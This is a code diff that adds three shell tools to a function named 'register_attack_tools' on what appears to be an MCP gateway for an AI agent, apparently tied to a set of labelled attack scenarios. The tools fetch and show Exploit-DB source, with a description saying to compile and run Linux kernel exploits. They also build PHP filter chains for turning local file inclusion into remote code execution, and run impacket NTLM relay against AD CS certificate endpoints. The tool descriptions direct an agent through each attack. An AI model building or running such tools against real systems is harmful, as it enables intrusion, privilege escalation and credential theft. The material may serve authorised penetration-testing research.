@@ -1168,6 +1168,38 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=60,
     )
+    gateway.register_shell_tool(
+        name="searchsploit_copy",
+        command_template="searchsploit -m {exploit_id} 2>&1 && cat $(searchsploit -p {exploit_id} 2>/dev/null | grep 'Path:' | head -1 | awk '{{print $NF}}' | tr -d $'\\r') 2>/dev/null",
+        description="Copy an Exploit-DB exploit to current directory and show its source code. Use for Linux kernel exploits (LNX-01~05) — download C source, then compile with gcc and execute. Use the EDB-ID (e.g. '12345') as exploit_id.",
+        parameters={
+            "exploit_id": {"type": "string", "description": "Exploit-DB ID (EDB-ID) to download"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+    gateway.register_shell_tool(
+        name="php_filter_chain",
+        command_template="python3 -c \"\nbase = '{file_path}'\nchain = 'php://filter/convert.base64-encode/resource=' + base\nfor _ in range({chain_depth}):\n    chain = 'php://filter/convert.base64-decode|convert.base64-encode/resource=' + chain\nprint(chain)\n\" 2>&1",
+        description="Generate a PHP filter chain for LFI-to-RCE attacks (WEB-06 CVE-2025-0366). Creates nested php://filter/ wrappers to achieve remote code execution from a local file inclusion vulnerability. Pass the target PHP file path and chain depth (default 8). Pipe output through curl to exploit.",
+        parameters={
+            "file_path": {"type": "string", "description": "Target PHP file path for inclusion (e.g. '/var/www/html/index.php')"},
+            "chain_depth": {"type": "integer", "description": "Filter chain depth (5-15, default 8 for PHP 8.x)"},
+        },
+        parser=_parse_shell_output,
+        timeout=15,
+    )
+    gateway.register_shell_tool(
+        name="impacket_ntlmrelayx",
+        command_template="timeout 30 impacket-ntlmrelayx -t {target_url} {extra_args} 2>&1",
+        description="Run NTLM relay attack via impacket-ntlmrelayx. Use for AD CS ESC8 (AD-06, AD-Chain-2/3/6) — relay captured NTLM authentication to AD CS HTTP endpoint to obtain certificates. Target URL should point to the AD CS certsrv endpoint (e.g. 'http://dc/certsrv/certfnsh.asp'). Add '-smb2support' for SMBv2 targets.",
+        parameters={
+            "target_url": {"type": "string", "description": "Target URL to relay NTLM auth to (e.g. AD CS HTTP endpoint)"},
+            "extra_args": {"type": "string", "description": "Additional ntlmrelayx arguments (e.g. '-smb2support --adcs')"},
+        },
+        parser=_parse_shell_output,
+        timeout=35,
+    )
 
     return gateway
 
